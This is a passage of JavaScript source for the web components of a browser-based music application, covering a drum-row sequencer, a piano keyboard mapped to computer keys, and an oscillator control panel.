		sliDetune.onchange = this._onchangeRowSlider.bind( this, id, "detune" );
		sliGain.onchange = this._onchangeRowSlider.bind( this, id, "gain" );
		sliPan.onchange = this._onchangeRowSlider.bind( this, id, "pan" );
		sliDetune.oninputend =
		sliGain.oninputend =
		sliPan.oninputend = this._oninputendRowSlider.bind( this, id );
		this._rows.set( id, html );
		this._lines.set( id, elLine );
		this.append( elRow );
		this._elLinesParent.append( elLine );
	}
	remove( id ) {
		this._rows.get( id ).root.remove();
		this._lines.get( id ).remove();
		this._rows.delete( id );
		this._lines.delete( id );
	}
	change( id, prop, val ) {
		switch ( prop ) {
			case "pan": this._changePan( id, val ); break;
			case "name": this._changeName( id, val ); break;
			case "gain": this._changeGain( id, val ); break;
			case "order": this._changeOrder( id, val ); break;
			case "detune": this._changeDetune( id, val ); break;
			case "toggle": this._changeToggle( id, val ); break;
			case "pattern": this._changePattern( id, val ); break;
			case "duration": this._changeDuration( id, val ); break;
		}
	}
	_changePan( id, val ) {
		this._rows.get( id ).pan.setValue( val );
	}
	_changeGain( id, val ) {
		this._rows.get( id ).gain.setValue( val );
	}
	_changeDetune( id, val ) {
		this._rows.get( id ).detune.setValue( val );
	}
	_changeName( id, name ) {
		const el = this._rows.get( id ).name;

		el.dataset.name =
		el.textContent = name;
	}
	_changeToggle( id, b ) {
		this._rows.get( id ).root.classList.toggle( "gsuiDrumrow-mute", !b );
		this._lines.get( id ).classList.toggle( "gsuiDrumrow-mute", !b );
	}
	_changeDuration( id, dur ) {
		this._rows.get( id ).root.querySelector( ".gsuiDrumrow-waveWrap" ).style.animationDuration = `${ dur * 2 }s`;
	}
	_changePattern( id, svg ) {
		const elWave = this._rows.get( id ).root.querySelector( ".gsuiDrumrow-waveWrap" );

		if ( elWave.firstChild ) {
			elWave.firstChild.remove();
		}
		if ( svg ) {
			svg.classList.add( "gsuiDrumrow-wave" );
			elWave.append( svg );
		}
	}
	_changeOrder( id, order ) {
		this._rows.get( id ).root.dataset.order =
		this._lines.get( id ).dataset.order = order;
	}

	// .........................................................................
	_namePrint( id, msg ) {
		const el = this._rows.get( id ).name;

		el.textContent = msg;
		el.classList.add( "gsuiDrumrow-nameInfo" );
	}
	_expandProps( id ) {
		this._rows.get( id ).root.classList.toggle( "gsuiDrumrow-open" );
		this._lines.get( id ).classList.toggle( "gsuiDrums-lineOpen" );
	}
	_getPropBtn( rowId, prop ) {
		return this._rows.get( rowId ).root
			.querySelector( `.gsuiDrumrow-propRadio[value="${ prop }"] + .gsuiDrumrow-propSpan` );
	}

	// events:
	// .........................................................................
	_oninputendRowSlider( id ) {
		const el = this._rows.get( id ).name;

		el.textContent = el.dataset.name;
		el.classList.remove( "gsuiDrumrow-nameInfo" );
	}
	_onchangeRowSlider( id, prop, val ) {
		this._dispatch( "change", "changeDrumrow", id, prop, val );
	}
	_onreorderRows( elRow ) {
		const rows = gsuiReorder.listComputeOrderChange( this, {} );

		this._dispatch( "change", "reorderDrumrow", elRow.dataset.id, rows );
	}
	_onchangeRows( e ) {
		const id = e.target.closest( ".gsuiDrumrow" ).dataset.id;

		this._dispatch( "propFilter", id, e.target.value );
	}
	_onclickRows( e ) {
		if ( e.target !== this ) {
			const id = e.target.closest( ".gsuiDrumrow" ).dataset.id;

			switch ( e.target.dataset.action ) {
				case "props": this._expandProps( id ); break;
				case "toggle": this._dispatch( "change", "toggleDrumrow", id ); break;
				case "delete": this._dispatch( "change", "removeDrumrow", id ); break;
			}
		}
	}
	_onmousedownRows( e ) {
		if ( ( e.button === 0 || e.button === 2 ) && e.target.classList.contains( "gsuiDrumrow-main" ) ) {
			this._dispatch(
				e.button === 0 ? "liveStartDrum" : "liveStopDrum",
				e.target.parentNode.dataset.id );
		}
	}
	_onanimationendRows( e ) {
		if ( e.target.classList.contains( "gsuiDrumrow-startCursor" ) ) {
			e.target.remove();
		}
	}
	_oncontextmenuRows( e ) {
		e.preventDefault();
		if ( e.target.dataset.action === "toggle" ) {
			this._dispatch( "change", "toggleSoloDrumrow", e.target.closest( ".gsuiDrumrow" ).dataset.id );
		} else if ( e.target.classList.contains( "gsuiDrumrow-propSpan" ) ) {
			this._dispatch( "propFilters", e.target.previousElementSibling.value );
		}
	}
	_ondropRows( e ) {
		if ( this._dragoverId ) {
			const [ patId ] = e.dataTransfer.getData( "pattern-buffer" ).split( ":" );

			if ( patId ) {
				this._dragoverId === Infinity
					? this._dispatch( "change", "addDrumrow", patId )
					: this._dispatch( "change", "changeDrumrowPattern", this._dragoverId, patId );
			}
		}
		this._ondragleaveRows();
	}
	_ondragleaveRows() {
		if ( this._elDragover ) {
			this._elDragover.classList.remove( "gsuiDrumrows-dragover" );
			this._elDragover =
			this._dragoverId = null;
		}
	}
	_ondragoverRows( e ) {
		if ( e.dataTransfer.types.includes( "pattern-buffer" ) ) {
			const tar = e.target,
				isParent = tar.classList.contains( "gsuiDrumrows" ),
				elDragover = isParent ? tar : tar.closest( ".gsuiDrumrow" );

			if ( elDragover !== this._elDragover ) {
				this._dragoverId = null;
				if ( isParent ) {
					this._dragoverId = Infinity;
				} else if ( elDragover ) {
					this._dragoverId = elDragover.dataset.id;
				}
				if ( this._elDragover ) {
					this._elDragover.classList.remove( "gsuiDrumrows-dragover" );
				}
				this._elDragover = elDragover;
				if ( elDragover ) {
					elDragover.classList.add( "gsuiDrumrows-dragover" );
				}
			}
		}
	}
}

customElements.define( "gsui-drumrows", gsuiDrumrows );

GSUI.setTemplate( "gsui-drums-line", () => (
	GSUI.createElement( "div", { class: "gsuiDrums-line" },
		GSUI.createElement( "div", { class: "gsuiDrums-lineDrums" },
			GSUI.createElement( "div", { class: "gsuiDrums-lineIn" } ),
		),
		GSUI.createElement( "div", { class: "gsuiDrums-lineProps" },
			GSUI.createElement( "gsui-slidergroup" ),
		),
	)
) );

GSUI.setTemplate( "gsui-drums-drum", () => (
	GSUI.createElement( "div", { class: "gsuiDrums-drum" },
		GSUI.createElement( "div", { class: "gsuiDrums-drumIn" },
			[ "detune", "pan", "gain" ].map( p => (
				GSUI.createElement( "div", { class: "gsuiDrums-drumProp", "data-value": p },
					GSUI.createElement( "div", { class: "gsuiDrums-drumPropValue" } ),
				)
			) ),
		),
	)
) );

GSUI.setTemplate( "gsui-drums-drumcut", () => (
	GSUI.createElement( "div", { class: "gsuiDrums-drumcut" },
		GSUI.createElement( "div", { class: "gsuiDrums-drumcutIn" },
			GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "drumcut" } ),
		),
	)
) );

class gsuiDrums extends HTMLElement {
	constructor() {
		const drumrows = GSUI.createElement( "gsui-drumrows" ),
			win = GSUI.createElement( "gsui-timewindow", {
				panelsize: 140,
				panelsizemin: 70,
				panelsizemax: 240,
				lineheight: 48,
				lineheightmin: 48,
				lineheightmax: 48,
				pxperbeatmin: 50,
				pxperbeatmax: 160,
			} );

		super();
		this._win = win;
		this.drumrows = drumrows;
		this._hoverBeat =
		this._hoverPageX =
		this._linesPanelWidth = 0;
		this._stepsPerBeat = 4;
		this._pxPerBeat = 80;
		this._pxPerStep = this._pxPerBeat / this._stepsPerBeat;
		this._currAction = "";
		this._draggingRowId = null;
		this._draggingWhenStart = 0;
		this._hoveringStatus = "";
		this._drumsMap = new Map();
		this._previewsMap = new Map();
		this._sliderGroups = new Map();
		this._elLines = null;
		this._elHover = null;
		this._elCurrentTime = null;
		this._elDrumHover = GSUI.createElement( "div", { class: "gsuiDrums-drumHover" },
			GSUI.createElement( "div", { class: "gsuiDrums-drumHoverIn" } ) );
		this._elDrumcutHover = GSUI.createElement( "div", { class: "gsuiDrums-drumcutHover" },
			GSUI.createElement( "div", { class: "gsuiDrums-drumcutHoverIn" } ) );
		this._nlLinesIn = this.getElementsByClassName( "gsuiDrums-lineIn" );
		this._onmouseupNew = this._onmouseupNew.bind( this );
		this._mousemoveLines = this._mousemoveLines.bind( this );
		this._dispatch = GSUI.dispatchEvent.bind( null, this, "gsuiDrums" );
		Object.seal( this );

		this.addEventListener( "gsuiEvents", e => {
			const d = e.detail,
				dt = e.target.dataset;

			switch ( d.component ) {
				case "gsuiTimewindow":
					switch ( d.eventName ) {
						case "pxperbeat":
							this.setPxPerBeat( d.args[ 0 ] );
							e.stopPropagation();
							break;
					}
					break;
				case "gsuiSliderGroup":
					switch ( d.eventName ) {
						case "change":
							d.args.unshift( "changeDrumsProps", dt.currentProp );
							break;
						case "input":
							this.changeDrumProp( d.args[ 0 ], dt.currentProp, d.args[ 1 ] );
							d.args = [ dt.id, d.args[ 0 ], dt.currentProp, d.args[ 1 ] ];
							break;
						case "inputEnd":
							d.args = [ dt.id, dt.currentProp ];
							break;
					}
					break;
			}
		} );
		win.setAttribute( "step", 1 );
		win.onscroll = this.__mousemoveLines.bind( this );
		this._elDrumHover.remove();
		this._elDrumcutHover.remove();
		this._elDrumHover.onmousedown = this._onmousedownNew.bind( this, "Drums" );
		this._elDrumcutHover.onmousedown = this._onmousedownNew.bind( this, "Drumcuts" );
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			this.setAttribute( "tabindex", -1 );
			this.append( this._win, GSUI.createElement( "div", { class: "gsuiDrums-shadow" } ) );
			this.classList.add( "gsuiDrums" );
			this._win.querySelector( ".gsuiTimewindow-panelContent" ).append( this.drumrows );
			this._elCurrentTime = this._win.querySelector( ".gsuiTimewindow-currentTime" );
			this._elLines = this._win.querySelector( ".gsuiTimewindow-rows" );
			this._elLines.onmousemove = this._mousemoveLines;
			this._elLines.onmouseleave = this._onmouseleaveLines.bind( this );
			this.drumrows.setLinesParent( this._elLines, "gsuiDrums-line" );
		}
	}

	// .........................................................................
	toggleShadow( b ) {
		this.classList.toggle( "gsuiDrums-shadowed", b );
	}
	currentTime( beat ) {
		this._win.setAttribute( "currenttime", beat );
	}
	loop( a, b ) {
		a !== false
			? this._win.setAttribute( "loop", `${ a }-${ b }` )
			: this._win.removeAttribute( "loop" )
	}
	timeSignature( a, b ) {
		this._stepsPerBeat = b;
		this._win.setAttribute( "timesignature", `${ a },${ b }` );
		this._win.setAttribute( "currenttimestep", 1 / b );
		this.setPxPerBeat( this._pxPerBeat );
		this._elDrumHover.style.width =
		this._elDrumcutHover.style.width =
		this._elCurrentTime.style.width = `${ 1 / b }em`;
	}
	setFontSize( fs ) {
		this._win.setAttribute( "lineheight", fs );
	}
	setPxPerBeat( ppb ) {
		const ppbpx = `${ ppb }px`;

		this._pxPerBeat = ppb;
		this._pxPerStep = ppb / this._stepsPerBeat;
		this._win.setAttribute( "pxperbeat", ppb );
		this._sliderGroups.forEach( grp => grp.setPxPerBeat( ppb ) );
	}
	setPropValues( rowId, prop, arr ) {
		const grp = this._sliderGroups.get( rowId );

		this._qS( `line[data-id='${ rowId }']` ).dataset.prop = prop;
		grp.dataset.currentProp = prop;
		switch ( prop ) {
			case "pan": grp.minMaxStep( -1, 1, .05 ); break;
			case "gain": grp.minMaxStep( 0, 1, .02 ); break;
			case "detune": grp.minMaxStep( -12, 12, 1 ); break;
		}
		arr.forEach( kv => grp.setProp( kv[ 0 ], "value", kv[ 1 ] ) );
	}

	// .........................................................................
	addDrum( id, drum ) {
		const grp = this._sliderGroups.get( drum.row ),
			prop = grp.dataset.currentProp;

		this._addItem( id, "drum", drum, "gsui-drums-drum" );
		grp.set( id, drum.when, 1 / this._stepsPerBeat, 0 );
	}
	removeDrum( id ) {
		const rowId = this._drumsMap.get( id )[ 0 ];

		this._sliderGroups.get( rowId ).delete( id );
		this._removeItem( id );
	}
	addDrumcut( id, drumcut ) {
		this._addItem( id, "drumcut", drumcut, "gsui-drums-drumcut" );
	}
	removeDrumcut( id ) {
		this._removeItem( id );
	}
	createDrumrow( id ) {
		const elLine = GSUI.getTemplate( "gsui-drums-line" ),
			grp = elLine.querySelector( "gsui-slidergroup" );

		grp.setPxPerBeat( this._pxPerBeat );
		grp.dataset.id = id;
		this._sliderGroups.set( id, grp );
		return elLine;
	}
	changeDrum( id, prop, val ) {
		const rowId = this._drumsMap.get( id )[ 0 ],
			grp = this._sliderGroups.get( rowId );

		this.changeDrumProp( id, prop, val );
		if ( prop === grp.dataset.currentProp ) {
			grp.setProp( id, "value", val );
		}
	}
	changeDrumProp( id, prop, val ) {
		const sel = `.gsuiDrums-drumProp[data-value="${ prop }"] .gsuiDrums-drumPropValue`,
			st = this._drumsMap.get( id )[ 3 ].querySelector( sel ).style;

		switch ( prop ) {
			case "detune":
				st.left = val > 0 ? "50%" : `${ ( 1 + val / 12 ) * 50 }%`;
				st.width = `${ Math.abs( val / 12 ) * 50 }%`;
				break;
			case "pan":
				st.left = val > 0 ? "50%" : `${ ( 1 + val ) * 50 }%`;
				st.width = `${ Math.abs( val ) * 50 }%`;
				break;
			case "gain":
				st.left = 0;
				st.width = `${ val * 100 }%`;
				break;
		}
	}
	_addItem( id, itemType, item, template ) {
		const elItem = GSUI.getTemplate( template ),
			stepDur = 1 / this._stepsPerBeat;

		elItem.dataset.id = id;
		elItem.style.left = `${ item.when }em`;
		elItem.style.width = `${ stepDur }em`;
		this._qS( `line[data-id='${ item.row }'] .gsuiDrums-lineIn` ).append( elItem );
		this._drumsMap.set( id, [ item.row, itemType, Math.round( item.when / stepDur ), elItem ] );
	}
	_removeItem( id ) {
		const elItem = this._drumsMap.get( id )[ 3 ];

		elItem.remove();
		this._drumsMap.delete( id );
	}

	// .........................................................................
	_qS( c ) {
		return ( this.firstChild ? this : this._win ).querySelector( `.gsuiDrums-${ c }` );
	}
	_has( el, c ) {
		return el.classList.contains( `gsuiDrums-${ c }` );
	}
	_createPreview( template, rowId, when ) {
		const el = GSUI.getTemplate( template );

		el.classList.add( "gsuiDrums-preview" );
		el.style.left = `${ when }em`;
		el.style.width = `${ 1 / this._stepsPerBeat }em`;
		this._qS( `line[data-id='${ rowId }'] .gsuiDrums-lineIn` ).append( el );
		return el;
	}
	_createPreviews( whenFrom, whenTo ) {
		const rowId = this._draggingRowId,
			stepDur = 1 / this._stepsPerBeat,
			whenA = Math.round( Math.min( whenFrom, whenTo ) / stepDur ),
			whenB = Math.round( Math.max( whenFrom, whenTo ) / stepDur ),
			added = new Map(),
			map = this._previewsMap,
			adding = this._currAction.startsWith( "add" ),
			itemType = this._currAction.endsWith( "Drums" ) ? "drum" : "drumcut",
			template = itemType === "drum"
				? "gsui-drums-drum"
				: "gsui-drums-drumcut",
			drumsArr = [];

		this._drumsMap.forEach( ( arr, id ) => {
			if ( arr[ 0 ] === rowId && arr[ 1 ] === itemType ) {
				drumsArr.push( arr );
			}
		} );
		for ( let w = whenA; w <= whenB; ++w ) {
			added.set( w );
			if ( !map.has( w ) ) {
				if ( adding ) {
					map.set( w, this._createPreview( template, rowId, w * stepDur ) );
				} else {
					drumsArr.find( arr => {
						if ( arr[ 2 ] === w ) {
							arr[ 3 ].classList.add( "gsuiDrums-previewDeleted" );
							map.set( w, arr[ 3 ] );
							return true;
						}
					} );
				}
			}
		}
		map.forEach( ( el, w ) => {
			if ( !added.has( w ) ) {
				adding
					? el.remove()
					: el.classList.remove( "gsuiDrums-previewDeleted" );
				map.delete( w );
			}
		} );
	}
	_removePreviews( adding ) {
		this._previewsMap.forEach( adding
			? el => el.remove()
			: el => el.classList.remove( "gsuiDrums-previewDeleted" ) );
		this._previewsMap.clear();
	}

	// events:
	// .........................................................................
	_mousemoveLines( e ) {
		if ( e.target !== this._elHover ) {
			if ( this._currAction ) {
				this._hoverPageX = e.pageX;
				this.__mousemoveLines();
			} else {
				const tar = e.target,
					elLine = this._has( tar, "lineIn" )
						? tar
						: this._has( tar, "drum" ) || this._has( tar, "drumcut" )
							? tar.parentNode
							: null;

				if ( elLine ) {
					const bcr = elLine.getBoundingClientRect(),
						y = ( e.pageY - bcr.top ) / bcr.height,
						elHover =  y > .66 ? this._elDrumcutHover : this._elDrumHover;

					this._hoverPageX = e.pageX;
					this._hoveringStatus = elHover === this._elDrumHover ? "drum" : "drumcut";
					if ( elHover !== this._elHover ) {
						if ( this._elHover ) {
							this._elHover.remove();
						}
						this._elHover = elHover;
					}
					this.__mousemoveLines();
					if ( this._elHover.parentNode !== elLine ) {
						elLine.append( this._elHover );
					}
				} else if ( this._elHover ) {
					this._elHover.remove();
				}
			}
		}
	}
	__mousemoveLines() {
		if ( this._hoveringStatus ) {
			const el = this._elHover,
				left = this._elLines.getBoundingClientRect().left,
				beat = ( ( this._hoverPageX - left ) / this._pxPerStep | 0 ) / this._stepsPerBeat;

			this._hoverBeat = beat;
			el.style.left = `${ beat }em`;
			if ( this._currAction ) {
				this._createPreviews( this._draggingWhenStart, beat );
			}
		}
	}
	_onmouseleaveLines() {
		if ( !this._currAction ) {
			this._hoveringStatus = "";
			this._elHover.remove();
		}
	}
	_onmousedownNew( itemType, e ) {
		if ( !this._currAction ) {
			this._currAction = e.button === 0
				? `add${ itemType }`
				: `remove${ itemType }`;
			this._draggingRowId = this._elHover.closest( ".gsuiDrums-line" ).dataset.id;
			this._draggingWhenStart = this._hoverBeat;
			this._createPreviews( this._hoverBeat, this._hoverBeat );
			GSUI.unselectText();
			this._elLines.onmousemove = null;
			document.addEventListener( "mousemove", this._mousemoveLines );
			document.addEventListener( "mouseup", this._onmouseupNew );
		}
	}
	_onmouseupNew() {
		this._removePreviews( this._currAction.startsWith( "add" ) );
		document.removeEventListener( "mousemove", this._mousemoveLines );
		document.removeEventListener( "mouseup", this._onmouseupNew );
		this._elLines.onmousemove = this._mousemoveLines;
		this._dispatch( "change", this._currAction, this._draggingRowId,
			this._draggingWhenStart, this._hoverBeat );
		this._currAction = "";
	}
}

customElements.define( "gsui-drums", gsuiDrums );

GSUI.setTemplate( "gsui-keys-octave", () => [
	GSUI.createElement( "div", { class: "gsuiKey",              "data-key": 11 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row",                   "data-key": 11 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey gsuiKeyBlack", "data-key": 10 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row  gsuiKeyBlack-row", "data-key": 10 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey",              "data-key":  9 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row",                   "data-key":  9 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey gsuiKeyBlack", "data-key":  8 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row  gsuiKeyBlack-row", "data-key":  8 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey",              "data-key":  7 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row",                   "data-key":  7 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey gsuiKeyBlack", "data-key":  6 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row  gsuiKeyBlack-row", "data-key":  6 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey",              "data-key":  5 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row",                   "data-key":  5 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey",              "data-key":  4 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row",                   "data-key":  4 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey gsuiKeyBlack", "data-key":  3 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row  gsuiKeyBlack-row", "data-key":  3 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey",              "data-key":  2 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row",                   "data-key":  2 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey gsuiKeyBlack", "data-key":  1 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row  gsuiKeyBlack-row", "data-key":  1 }, GSUI.createElement( "div" ) ) ),
	GSUI.createElement( "div", { class: "gsuiKey",              "data-key":  0 }, GSUI.createElement( "div", { class: "gsui-row gsuiKey-row",                   "data-key":  0 }, GSUI.createElement( "div" ) ) ),
] );

class gsuiKeys extends HTMLElement {
	constructor() {
		super();
		this._keysDown = new Map();
		this._gain = 1;
		this._nbOct =
		this._rootTop =
		this._octStart =
		this._blackKeyR =
		this._blackKeyH =
		this._keyIndMouse = 0;
		this.onkeyup =
		this.onkeydown =
		this._elKeyMouse = null;
		this._evmuRoot = this._evmuRoot.bind( this );
		this._evmmRoot = this._evmmRoot.bind( this );
		Object.seal( this );

		this.onmousedown = this._evmdRoot.bind( this );
	}

	// .........................................................................
	connectedCallback() {
		this.classList.add( "gsuiKeys" );
	}

	// .........................................................................
	octaves( start, nbOct ) {
		const maxOct = start + nbOct;

		Array.prototype.forEach.call( this.children, el => {
			el.remove();
			el._rowElement.remove();
		} );
		this._nbOct = nbOct;
		this._octStart = start;
		this.style.counterReset = `octave ${ maxOct }`;
		this.style.height = `${ nbOct * 12 }em`;
		for ( let i = 0; i < nbOct; ++i ) {
			this.append( ...GSUI.getTemplate( "gsui-keys-octave" ) );
		}
		Array.prototype.reduce.call( this.children, ( midi, elKey, i ) => {
			const elRow = elKey.firstElementChild;

			elKey._rowElement = elRow;
			elRow._keyElement = elKey;
			elKey.dataset.midi =
			elRow.dataset.midi = midi - 1;
			elKey.style.top =
			elRow.style.top = `${ i }em`;
			return midi - 1;
		}, maxOct * 12 );
		return this.querySelectorAll( ".gsui-row" );
	}
	getKeyElementFromMidi( midi ) {
		return this.children[ this.children.length - 1 - ( midi - this._octStart * 12 ) ];
	}
	getMidiKeyFromKeyboard( e ) {
		const k = gsuiKeys.keyboardToKey[ e.code ];

		return k
			? ( 4 + k[ 0 ] ) * 12 + k[ 1 ]
			: false;
	}
	midiReleaseAllKeys() {
		this._keysDown.forEach( ( _, midi ) => this.midiKeyUp( midi ) );
		this._evmuRoot();
	}
	midiKeyDown( midi ) {
		this._keyUpDown( this.getKeyElementFromMidi( midi ), true );
	}
	midiKeyUp( midi ) {
		this._keyUpDown( this.getKeyElementFromMidi( midi ), false );
	}

	// .........................................................................
	_isBlack( keyInd ) {
		return keyInd === 1 || keyInd === 3 || keyInd === 5 || keyInd === 8 || keyInd === 10;
	}
	_keyUpDown( elKey, status ) {
		const midi = +elKey.dataset.midi;

		elKey.classList.toggle( "gsui-active", status );
		if ( status ) {
			this._keysDown.set( midi );
			this.onkeydown && this.onkeydown( midi, this._gain );
		} else {
			this._keysDown.delete( midi );
			this.onkeyup && this.onkeyup( midi, this._gain );
		}
	}

	// .........................................................................
	_evmdRoot( e ) {
		if ( this._nbOct ) {
			const blackKeyBCR = this.children[ 1 ].getBoundingClientRect();

			this._rootTop = this.getBoundingClientRect().top;
			this._blackKeyR = blackKeyBCR.right;
			this._blackKeyH = blackKeyBCR.height;
			this._gain = Math.min( e.layerX / ( e.target.clientWidth - 1 ), 1 );
			document.addEventListener( "mouseup", this._evmuRoot );
			document.addEventListener( "mousemove", this._evmmRoot );
			this._evmmRoot( e );
		}
	}
	_evmuRoot() {
		document.removeEventListener( "mouseup", this._evmuRoot );
		document.removeEventListener( "mousemove", this._evmmRoot );
		if ( this._elKeyMouse ) {
			this._keyUpDown( this._elKeyMouse, false );
			this._elKeyMouse =
			this._keyIndMouse = null;
		}
		this._gain = 1;
	}
	_evmmRoot( e ) {
		const fKeyInd = ( e.clientY - this._rootTop ) / this._blackKeyH;
		let iKeyInd = ~~fKeyInd;

		if ( e.clientX > this._blackKeyR && this._isBlack( ~~( iKeyInd % 12 ) ) ) {
			iKeyInd += fKeyInd - iKeyInd < .5 ? -1 : 1;
		}
		if ( this._keyIndMouse !== iKeyInd ) {
			const elKey = this.children[ iKeyInd ];

			if ( elKey ) {
				if ( this._elKeyMouse ) {
					this._keyUpDown( this._elKeyMouse, false );
				}
				this._elKeyMouse = elKey;
				this._keyIndMouse = iKeyInd;
				this._keyUpDown( elKey, true );
			}
		}
	}
}

gsuiKeys.midiToKeyStr = m => gsuiKeys.keyIds[ m % 12 ] + ~~( m / 12 );
gsuiKeys.keyStrToMidi = k => {
	const key = k.substr( 0, k[ 1 ] !== "#" ? 1 : 2 );

	return k.substr( key.length ) * 12 + gsuiKeys.keyIds[ key ];
};

customElements.define( "gsui-keys", gsuiKeys );

gsuiKeys.keyNames = Object.freeze( {
	en: Object.freeze( [ "c",  "c#",  "d",  "d#",  "e",  "f",  "f#",  "g",   "g#",   "a",  "a#",  "b" ] ),
	fr: Object.freeze( [ "do", "do#", "r?", "r?#", "mi", "fa", "fa#", "sol", "sol#", "la", "la#", "si" ] ),
} );

gsuiKeys.keyIds = Array.from( gsuiKeys.keyNames.en );
gsuiKeys.keyIds.forEach( ( k, i, arr ) => arr[ k ] = i );
Object.freeze( gsuiKeys.keyIds );

gsuiKeys.keyboardToKey = {

	//         [ relative octave, key index (C = 0, C# = 1) ]
	// keyboard down
	KeyZ:      [ 0, 0 ],
	KeyS:      [ 0, 1 ],
	KeyX:      [ 0, 2 ],
	KeyD:      [ 0, 3 ],
	KeyC:      [ 0, 4 ],
	KeyV:      [ 0, 5 ],
	KeyG:      [ 0, 6 ],
	KeyB:      [ 0, 7 ],
	KeyH:      [ 0, 8 ],
	KeyN:      [ 0, 9 ],
	KeyJ:      [ 0, 10 ],
	KeyM:      [ 0, 11 ],
	Comma:     [ 1, 0 ],
	KeyL:      [ 1, 1 ],
	Period:    [ 1, 2 ],
	Semicolon: [ 1, 3 ],
	Slash:     [ 1, 4 ],

	// keyboard up
	KeyQ:         [ 1, 0 ],
	Digit2:       [ 1, 1 ],
	KeyW:         [ 1, 2 ],
	Digit3:       [ 1, 3 ],
	KeyE:         [ 1, 4 ],
	KeyR:         [ 1, 5 ],
	Digit5:       [ 1, 6 ],
	KeyT:         [ 1, 7 ],
	Digit6:       [ 1, 8 ],
	KeyY:         [ 1, 9 ],
	Digit7:       [ 1, 10 ],
	KeyU:         [ 1, 11 ],
	KeyI:         [ 2, 0 ],
	Digit9:       [ 2, 1 ],
	KeyO:         [ 2, 2 ],
	Digit0:       [ 2, 3 ],
	KeyP:         [ 2, 4 ],
	BracketLeft:  [ 2, 5 ],
	Equal:        [ 2, 6 ],
	BracketRight: [ 2, 7 ],
};

GSUI.setTemplate( "gsui-oscillator", () => {
	return [
		GSUI.createElement( "div", { class: "gsuiOscillator-grip gsuiIcon", "data-icon": "grip-v" } ),
		GSUI.createElement( "div", { class: "gsuiOscillator-wave" },
			GSUI.createElement( "gsui-periodicwave" ),
			GSUI.createElement( "gsui-periodicwave" ),
		),
		GSUI.createElement( "button", { class: "gsuiOscillator-waveBtn gsuiOscillator-wavePrev gsuiIcon", "data-icon": "caret-left", title: "Previous wave" } ),
		GSUI.createElement( "button", { class: "gsuiOscillator-waveBtn gsuiOscillator-waveNext gsuiIcon", "data-icon": "caret-right", title: "Next wave" } ),
		GSUI.createElement( "select", { class: "gsuiOscillator-waveSelect" },
			[ "sine", "triangle", "sawtooth", "square" ].map( w => (
				GSUI.createElement( "option", { class: "gsuiOscillator-waveOptNative", value: w }, w )
			) )
		),
		[
			[ "detune", "pitch", -24, 24, 1 ],
			[ "pan", "pan", -1, 1, .02 ],
			[ "gain", "gain", 0, 1, .01 ],
		].map( ( [ attr, title, min, max, step ] ) => (
			GSUI.createElement( "div", { class: `gsuiOscillator-prop gsuiOscillator-${ attr }`, title },
				GSUI.createElement( "div", { class: "gsuiOscillator-sliderWrap" },
					GSUI.createElement( "gsui-slider", { type: "circular", min, max, step, "mousemove-size": "800" } )
				),
				GSUI.createElement( "div", { class: "gsuiOscillator-sliderValue" } ),
			)
		) ),
		GSUI.createElement( "button", { class: "gsuiOscillator-remove gsuiIcon", "data-icon": "close", title: "Remove the oscillator" } ),
	].flat( 1 );
} );

class gsuiOscillator extends HTMLElement {
	constructor() {
		const children = GSUI.getTemplate( "gsui-oscillator" ),
			waves = [
				children[ 1 ].firstChild,
				children[ 1 ].lastChild,
			];

		super();
		this._children = children;
		this._waves = waves;
		this._elSelect = children[ 4 ];
		this._timeidType = null;
		this._sliders = Object.freeze( {
			detune: this._initSlider( 5, "detune" ),
			pan: this._initSlider( 6, "pan" ),
			gain: this._initSlider( 7, "gain" ),
		} );
		this._selectWaves = {
			sine: true,
			triangle: true,
			sawtooth: true,
			square: true,
		};
		this._dispatch = GSUI.dispatchEvent.bind( null, this, "gsuiOscillator" );
		Object.seal( this );

		waves[ 0 ].frequency =
		waves[ 1 ].frequency = 1;
		this._elSelect.onchange = this._onchangeSelect.bind( this );
		this._elSelect.onkeydown = this._onkeydownSelect.bind( this );
		children[ 2 ].onclick = this._onclickPrevNext.bind( this, -1 );
		children[ 3 ].onclick = this._onclickPrevNext.bind( this, 1 );
		children[ 8 ].onclick = () => this._dispatch( "remove" );
	}

	// .........................................................................
	connectedCallback() {
		if ( this._children ) {
			this.classList.add( "gsuiOscillator" );
			this.setAttribute( "draggable", "true" );
			this.append( ...this._children );
			this._children = null;
		}
	}
	static get observedAttributes() {
		return [ "order", "type", "detune", "gain", "pan" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			const num = +val;

			switch ( prop ) {
				case "order": this._changeOrder( num ); break;
				case "type": this._changeType( val ); break;
				case "detune":
				case "gain":
				case "pan":
					this._changeProp( prop, num );
					break;
			}
		}
	}

	// .........................................................................
	addWaves( arr ) {
		const opts = [];

		arr.sort();
		arr.forEach( w => {
			if ( !this._selectWaves[ w ] ) {
				const opt = document.createElement( "option" );

				this._selectWaves[ w ] = true;
				opt.value = w;
				opt.className = "gsuiOscillator-waveOpt";
				opt.textContent = w;
				opts.push( opt );
			}
		} );
		Element.prototype.append.apply( this._elSelect, opts );
	}
